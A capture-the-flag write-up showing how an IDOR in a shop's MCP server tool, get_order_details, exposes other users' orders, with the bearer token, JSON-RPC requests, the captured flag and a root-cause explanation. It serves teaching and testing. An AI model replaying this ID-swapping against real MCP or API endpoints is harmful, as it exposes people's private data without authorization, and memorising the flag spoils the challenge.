# Embrace MCP :: 001 - Writeup

## Overview

The SimsShop web app exposes a Model Context Protocol (MCP) server at `/api/mcp` with a bearer token shown on the AI Integration page. The MCP server provides tools to fetch order data. The intended user should only be able to view their own orders, but the `get_order_details` tool accepts an arbitrary `orderId` and does not enforce authorization. This is an Insecure Direct Object Reference (IDOR), which allows an attacker to read other users' orders and discover the flag.

## Target

- URL: `http://159.65.255.102:31259`
- Flag format: `flag{flag_here}`

## Recon

The landing page contains MCP configuration with a bearer token:

```
{
  "mcpServers": {
    "SimsShop": {
      "url": "/api/mcp",
      "headers": {
        "Authorization": "Bearer 98BD10E8FB953615FC0C71E902696F9D"
      }
    }
  }
}
```

This indicates the MCP server is accessible to clients with that token.

## MCP Initialization

The MCP endpoint requires the client to accept both JSON and SSE:

```
Accept: application/json, text/event-stream
```

Initialize MCP:

```
POST /api/mcp
Content-Type: application/json
Accept: application/json, text/event-stream
Authorization: Bearer 98BD10E8FB953615FC0C71E902696F9D

{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"ctf","version":"1.0"}}}
```

## Enumerate Tools

List tools:

```
{"jsonrpc":"2.0","id":2,"method":"tools/list"}
```

Result:

- `get_user_orders` - returns orders for the authenticated user
- `get_order_details` - returns details for a specific order

## Verify Normal Access

Calling `get_user_orders` returns two orders:

```
{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"get_user_orders","arguments":{}}}
```

Response:

```
001335, 001336
```

Calling `get_order_details` on one of these works as expected.

## Vulnerability: IDOR in get_order_details

The `get_order_details` tool accepts any `orderId` string, but does not verify that the order belongs to the authenticated user. This enables unauthorized access to other users' orders by changing the ID.

## Exploitation

Request details for a different order ID (`001337`):

```
{"jsonrpc":"2.0","id":13,"method":"tools/call","params":{"name":"get_order_details","arguments":{"orderId":"001337"}}}
```

Response includes a `flag` field:

```
"flag": "78c95d4e-6154-4740-8042-ea6c5ef18e44"
```

## Flag

```
flag{78c95d4e-6154-4740-8042-ea6c5ef18e44}
```

## Root Cause

Missing authorization check in the MCP tool implementation. The server should verify that `orderId` belongs to the authenticated user before returning data.
